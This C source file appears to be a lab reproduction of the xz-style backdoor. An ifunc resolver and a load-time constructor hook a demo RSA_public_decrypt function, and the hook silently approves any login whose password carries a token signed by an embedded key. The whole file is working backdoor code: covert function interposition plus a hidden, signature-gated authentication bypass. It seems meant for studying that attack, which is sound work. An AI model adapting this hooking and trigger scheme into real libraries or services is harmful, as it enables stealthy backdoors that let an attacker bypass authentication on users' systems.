#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include "trusted_key.h"
#include "xz_demo.h"

/* All trigger knowledge belongs to this injected object. The normal host sees
   only an ordinary password string. Our toy envelope is XZLAB1:TOKEN_HEX:SIG_HEX;
   it stands in for trigger data carried inside an existing authentication input. */
static int hex_digit(char value) {
    if (value >= '0' && value <= '9') return value - '0';
    if (value >= 'a' && value <= 'f') return value - 'a' + 10;
    if (value >= 'A' && value <= 'F') return value - 'A' + 10;
    return -1;
}

static int decode_hex(const char *text, unsigned char *bytes, size_t length) {
    for (size_t i = 0; i < length; ++i) {
        int high = hex_digit(text[2 * i]);
        int low = hex_digit(text[2 * i + 1]);
        if (high < 0 || low < 0) return 0;
        bytes[i] = (unsigned char)((high << 4) | low);
    }
    return 1;
}

static int verified_trigger(const char *password) {
    static const char prefix[] = "XZLAB1:";
    const unsigned char expected[] = "XZ-LAB:fixed-auth-control-flow-demo:v1";
    unsigned char token[sizeof(expected) - 1], signature[64];
    size_t token_size = sizeof(token), signature_size = sizeof(signature);
    size_t prefix_size = sizeof(prefix) - 1;
    if (strlen(password) != prefix_size + 2 * token_size + 1 + 2 * signature_size ||
        strncmp(password, prefix, prefix_size) != 0) return 0;
    const char *token_hex = password + prefix_size;
    if (token_hex[2 * token_size] != ':') return 0;
    const char *signature_hex = token_hex + 2 * token_size + 1;
    if (!decode_hex(token_hex, token, token_size) ||
        !decode_hex(signature_hex, signature, signature_size) ||
        memcmp(token, expected, token_size) != 0) return 0;

    BIO *bio = BIO_new_mem_buf(TRUSTED_PUBLIC_KEY, -1);
    if (!bio) return 0;
    EVP_PKEY *key = PEM_read_bio_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);
    EVP_MD_CTX *context = EVP_MD_CTX_new();
    int valid = key && context &&
        EVP_DigestVerifyInit(context, NULL, NULL, NULL, key) == 1 &&
        EVP_DigestVerify(context, signature, signature_size, token, token_size) == 1;
    EVP_MD_CTX_free(context);
    EVP_PKEY_free(key);
    return valid;
}

/* Store the original address independently of the intercepted symbol name. */
typedef int (*rsa_decrypt_fn)(const char *, const char *);
static rsa_decrypt_fn original_RSA_public_decrypt;

static int hooked_RSA_public_decrypt_demo(const char *username, const char *password) {
    if (!original_RSA_public_decrypt) return 0;
    if (verified_trigger(password)) {
        return 1;
    }
    /* Call the saved address, NOT RSA_public_decrypt_demo by name (recursion). */
    return original_RSA_public_decrypt(username, password);
}

/* The resolver runs during loading and only selects the replacement address.
   File parsing and signature checks happen later when that function is called. */
static rsa_decrypt_fn resolve_RSA_public_decrypt_demo(void) {
    return hooked_RSA_public_decrypt_demo;
}

int RSA_public_decrypt_demo(const char *, const char *)
    __attribute__((ifunc("resolve_RSA_public_decrypt_demo")));

/* After relocation, save the separate original function before main() starts.
   RTLD_NEXT skips this library and finds libcrypto_demo.so. Calling the saved
   address later avoids looking up our own replacement again. */
__attribute__((constructor))
static void save_original_RSA_public_decrypt_demo(void) {
    original_RSA_public_decrypt = (rsa_decrypt_fn)dlsym(RTLD_NEXT, "RSA_public_decrypt_demo");
}
